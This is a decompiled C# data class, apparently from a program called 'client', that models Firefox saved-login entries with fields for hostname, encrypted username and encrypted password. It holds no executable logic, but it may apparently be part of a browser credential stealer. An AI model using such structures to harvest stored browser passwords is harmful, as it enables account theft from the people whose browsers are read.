using System;
using System.Runtime.Serialization;

namespace client.Models
{
	// Token: 0x02000016 RID: 22
	public class FirefoxLogins
	{
		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060000A2 RID: 162 RVA: 0x00002975 File Offset: 0x00000B75
		// (set) Token: 0x060000A3 RID: 163 RVA: 0x0000297D File Offset: 0x00000B7D
		[DataMember(Name = "hostname")]
		public string hostname { get; set; }

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060000A4 RID: 164 RVA: 0x00002986 File Offset: 0x00000B86
		// (set) Token: 0x060000A5 RID: 165 RVA: 0x0000298E File Offset: 0x00000B8E
		[DataMember(Name = "encryptedUsername")]
		public string encryptedUsername { get; set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060000A6 RID: 166 RVA: 0x00002997 File Offset: 0x00000B97
		// (set) Token: 0x060000A7 RID: 167 RVA: 0x0000299F File Offset: 0x00000B9F
		[DataMember(Name = "encryptedPassword")]
		public string encryptedPassword { get; set; }
	}
}
